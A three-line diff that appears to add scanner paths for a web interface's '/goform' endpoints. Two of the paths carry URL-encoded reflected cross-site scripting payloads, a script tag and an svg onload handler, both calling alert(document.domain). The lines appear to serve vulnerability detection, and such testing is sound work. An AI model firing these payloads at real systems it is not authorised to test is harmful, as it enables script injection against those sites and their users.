@@ -1,0 +1,3 @@
+/goform/activate_process?isv=&akey=&hostid=&count=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/goform/login_process?username=test%22%3E%3Csvg/onload=alert(document.domain)%3E
+/goforms/rlminfo
